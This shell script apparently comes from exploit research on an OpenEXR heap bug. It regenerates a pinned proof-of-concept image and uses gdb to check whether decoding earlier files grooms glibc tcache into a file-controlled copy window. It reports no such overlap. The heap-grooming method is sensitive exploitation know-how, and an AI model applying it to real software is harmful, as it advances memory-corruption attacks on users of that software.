#!/bin/sh
# W189: natural grooming by earlier files in the SAME unmodified exrcheck -c
# process. N valid deep-ZSTD files are decoded before the pinned W184 PoC; a
# conditional breakpoint selects the PoC's sink (inPtr[0] == 0x5a).  The probe
# prints every live tcache user pointer in dst+0..dst+384.
#
# Result: two deterministic layouts by parity of N; no tcache next pointer
# ever enters the 384-byte file-chosen window.  This closes the plausible
# in-consumer grooming route to W187's harness-only steering.  No code
# pointer, command, marker, wire or witness verdict is claimed.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p work-mixed evidence

BASE=work-mixed/baseline_deep_mixed.exr
C1=work-mixed/w188-c1.exr
bin-vuln-plain/gen_baseline_deep_mixed "$BASE" > /dev/null
python3 cases/make_poc_mixed_full.py "$BASE" "$C1" 64 0x5a 256 > /dev/null
test "$(sha256sum "$C1" | cut -d' ' -f1)" = \
    2ab3ea9751736720030d606cd3dd947dd000039da537a47bf822f1f18dd618f7

probe() { # N
    n=$1
    args="-c"
    i=0
    while [ "$i" -lt "$n" ]; do
        args="$args $BASE"
        i=$((i + 1))
    done
    args="$args $C1"
    gdb -q -batch \
        -ex 'set pagination off' -ex 'set confirm off' \
        -ex 'set disable-randomization on' \
        -ex 'break sort2_4ByteChannels_tiled if inPtr[0] == 0x5a' \
        -ex "run $args" \
        -x harness/tcache-reach2.cmd build-vuln-plain/bin/exrcheck 2>&1 \
        | grep -E '^(BASE|TCACHE idx|FINISHED)' \
        | sed -E 's/(BASE=0x|tcache=0x)[0-9a-f]+/\1NORM/g' \
        > "evidence/tcache-prior-$n.out"
}

run_all() {
    n=0
    while [ "$n" -le 8 ]; do
        probe "$n"
        n=$((n + 1))
    done
}

run_all
summary=evidence/tcache-prior-summary.out
: > "$summary"
n=0
while [ "$n" -le 8 ]; do
    echo "=== N=$n" >> "$summary"
    grep '^TCACHE' "evidence/tcache-prior-$n.out" >> "$summary"
    n=$((n + 1))
done

# Integrity: every probe reached the sink and finished; N=0 is W188's control;
# odd and even N each give one byte-stable layout.
n=0
while [ "$n" -le 8 ]; do
    grep -Fqx 'FINISHED' "evidence/tcache-prior-$n.out"
    n=$((n + 1))
done
grep -Fqx 'TCACHE idx=7 size=0x90 n=1 head_off=+4288 hits=[]' \
    evidence/tcache-prior-0.out
for n in 3 5 7; do
    grep '^TCACHE' evidence/tcache-prior-1.out > work-mixed/w189-odd.ref
    grep '^TCACHE' "evidence/tcache-prior-$n.out" > work-mixed/w189-odd.n
    diff -u work-mixed/w189-odd.ref work-mixed/w189-odd.n
done
for n in 4 6 8; do
    grep '^TCACHE' evidence/tcache-prior-2.out > work-mixed/w189-even.ref
    grep '^TCACHE' "evidence/tcache-prior-$n.out" > work-mixed/w189-even.n
    diff -u work-mixed/w189-even.ref work-mixed/w189-even.n
done

echo '=== RESULT'
cat "$summary"
hits=$(grep -h '^TCACHE' evidence/tcache-prior-*.out | grep -c 'hits=\[(' || true)
if [ "$hits" -eq 0 ]; then
    echo 'RESULT PASS (no tcache next pointer in copy window, 0..8 prior files)'
else
    echo "RESULT COUNTEREXAMPLE (hits in $hits probes)"
fi
